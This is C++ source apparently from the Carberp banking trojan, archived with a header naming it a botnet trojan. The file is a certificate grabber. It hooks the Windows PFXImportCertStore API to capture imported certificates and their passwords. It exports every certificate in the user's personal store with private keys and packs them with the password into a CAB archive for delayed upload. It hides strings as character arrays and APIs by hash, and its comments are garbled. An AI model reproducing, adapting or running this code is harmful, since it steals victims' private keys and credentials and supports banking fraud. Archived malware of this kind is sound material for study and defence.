/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
#include <windows.h>
#include <shlobj.h>

#include "CertGrab.h"

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "CabPacker.h"
#include "Loader.h"
#include "Splice.h"

//---------------------------------------------------------------------------

const static char CerdStoreName[]      = {'M', 'y', 0};
const static WCHAR CerdStorePassword[] = {'e', 'q', 'r', 'v', 'n', 'i', '3', '7', 'd', 's',  0};

// ��������� ���� ��� ��������� �������
typedef HCERTSTORE (WINAPI * PPFXImportCertStore)(CRYPT_DATA_BLOB* pPFX, LPCWSTR szPassword, DWORD dwFlags);

PPFXImportCertStore Real_PFXImportCertStore;


//-----------------------------------------------------------------------------

HCERTSTORE WINAPI Hook_PFXImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR password, DWORD flags)
{
	HCERTSTORE certstore = Real_PFXImportCertStore(data, password, flags);
	if(certstore != NULL && (flags & 0x10000000) == 0 && data && data->cbData > 0 && data->pbData != NULL)
	{
		// ���������� ����������
		TCertData Data;
		ClearStruct(Data);

		Data.Password = (PWCHAR)password;
		Data.Blob.pbData = data->pbData;
		Data.Blob.cbData = data->cbData;

        CertGrabber::SendCert(&Data);
	}

	return certstore;
}

//-----------------------------------------------------------------------------

bool HookCertGrabberApi()
{
	// ������������� ������� �������������� ������������
	const DWORD Hash_PFXImportCertStore = 0x3A1B7F5D;
	if(HookApi(DLL_CRYPT32, Hash_PFXImportCertStore, &Hook_PFXImportCertStore) )
	{
		__asm mov [Real_PFXImportCertStore], eax
	}
	else
		return false;

	return true;
}

//-----------------------------------------------------------------------------
void ClearCertData(PCertData Data)
{
	if (Data == NULL) return;
	if (Data->Blob.pbData != NULL)
		MemFree(Data->Blob.pbData);
    ClearStruct(*Data);
}
//-----------------------------------------------------------------------------

PCHAR GetSignalFileName()
{
	// ������� ���������� ��� ����������� �����.
	// ������������� ������ ����� � ������� ������� ��� � ���,
	// ��� �� ��� ������� ���������������� �����������
	const static char FName[] = {'i', 'e', 'u', 'n', 'i', 't', 'd', 'r', 'f', '.', 'i', 'n', 'f',  0};


	 // ������� ���������� ���� � ���������� �������� ������ ����������
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL) return NULL;

	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_SYSTEM, false))
		return NULL;

	PCHAR Result = STR::New(3, Path, "\\", (PCHAR)FName);
    STR::Free(Path);
	return Result;

}


//-----------------------------------------------------------------------------
void CertGrabber::Initialize()
{
	// ��� ������ ������� ������� �� ������������ ��� �����������,
	// ������� ��������� � ����������� ���������� ����������� �������
	// � ���������.
	// ��� ������� � ����, ��� � ��������� ��������� ������
	// �������������� ����������� �.�. ��� �������� ����������������
	// ����������� �� ����� ����������������

	

    PCHAR File = GetSignalFileName();
	
	if (!FileExistsA(File))
	{
		// ������ ������ �� ���� �������
		

		TCertData Data;
		ClearStruct(Data);

		Data.Name     = (PCHAR)CerdStoreName;
		Data.Password = (PWCHAR)CerdStorePassword;

		// ������������
		Export(&Data);

		
		// ���������� �����������
		SendCert(&Data);


		// ������� ���������
		ClearCertStore(Data.Name);


		// ��������������� ���������������� �����������
		Import(&Data);

		// ����������� ������
		ClearCertData(&Data);

		// ������ ���������� ����
		File::WriteBufferA(File, NULL, 0);
    }

	STR::Free(File);

	// ������������� ������ ���
	HookCertGrabberApi();

}

//-----------------------------------------------------------------------------


bool CertGrabber::Export(PCertData Data)
{
	// ������������ ��� ������������������ �����������
	if (Data == NULL) return false;

	bool Result = false;
	HANDLE Store = pCertOpenSystemStoreA( NULL, Data->Name );
	if (Store == NULL) return false;

	// ���������� ���������� ������������
	Data->Count = 0;
	PCCERT_CONTEXT CertContext = 0;
	while((CertContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore(Store, CertContext)) != NULL)
		Data->Count++;

	if (Data->Count > 0 )
	{
		//�������� ������ ���������.
		Data->Blob.pbData = NULL;
		Data->Blob.cbData = 0;
		if (pPFXExportCertStoreEx(Store, &Data->Blob, Data->Password, 0, EXPORT_PRIVATE_KEYS) != FALSE)
		{
			Data->Blob.pbData = (LPBYTE)MemAlloc(Data->Blob.cbData);
			if (pPFXExportCertStoreEx(Store, &Data->Blob, Data->Password, 0, EXPORT_PRIVATE_KEYS ) != FALSE )
				Result = true;
		}
	}
	else
		Result = true;
	pCertCloseStore(Store, 0 );

	return Result;
}
//-----------------------------------------------------------------------------

void CertGrabber::ClearCertStore(PCHAR Name)
{
	// �������� ��������� ������������

	HANDLE Store = pCertOpenSystemStoreA(NULL, Name);
	if( Store == NULL) return;

	PCCERT_CONTEXT CertContext = 0;
	while( (CertContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore( Store, CertContext )) != NULL )
	{
		PCCERT_CONTEXT dupCertContext = (PCCERT_CONTEXT)pCertDuplicateCertificateContext(CertContext);
		if(dupCertContext != NULL)
			pCertDeleteCertificateFromStore(dupCertContext);
	}

	pCertCloseStore( Store, 0 );
}
//-----------------------------------------------------------------------------

bool CertGrabber::Import(PCertData Data)
{
	// ������������� ����������� � ���������
	if (Data == NULL || Data->Blob.pbData == NULL)
		return false;

	bool Result = false;
	HANDLE pfxStore = pPFXImportCertStore( &Data->Blob, Data->Password, CRYPT_MACHINE_KEYSET | CRYPT_EXPORTABLE );
	if( pfxStore )
	{
		HANDLE hstore = pCertOpenSystemStoreA( NULL, Data->Name );
		if( hstore )
		{
			PCCERT_CONTEXT certContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore( pfxStore, 0) ;
			if( pCertAddCertificateContextToStore( hstore, certContext, CERT_STORE_ADD_ALWAYS /*CERT_STORE_ADD_NEW*/, 0) )
			   Result = true;
		}
		pCertCloseStore( hstore, 0 );
		pCertCloseStore( pfxStore, 0 );
	}
	return Result;

}

//-----------------------------------------------------------------------------

bool CertGrabber::SendCert(PCertData Data)
{
	// ��������� �����������
	const static char AppName[]  = {'c', 'e', 'r', 't',  0};
	const static char CertFile[] = {'c', 'e', 'r', 't', '.', 'p', 'f', 'x',  0};
	const static char PassFile[] = {'P', 'a', 's', 's', '.', 't', 'x', 't',  0};

	if (Data == NULL || Data->Blob.pbData == NULL || Data->Blob.cbData == 0)
		return false;

	PCHAR FileName = File::GetTempNameA();

	bool Result = false;

	HCAB Cab = CreateCab(FileName);
	if (Cab != NULL)
	{
		// ��������� ������ � �����
		PCHAR Pass = WSTR::ToAnsi(Data->Password, 0);

		AddBlobToCab(Cab, Data->Blob.pbData, Data->Blob.cbData, (PCHAR)CertFile);
		AddBlobToCab(Cab, Pass, STR::Length(Pass), (PCHAR)PassFile);

		STR::Free(Pass);

		// ��������� �����
		CloseCab(Cab);

		// ���������� ���
		Result = DataGrabber::SendCabDelayed(NULL, FileName, (PCHAR)AppName);
	}

	// ������� �����
	pDeleteFileA(FileName);

	STR::Free(FileName);
	return Result;
}

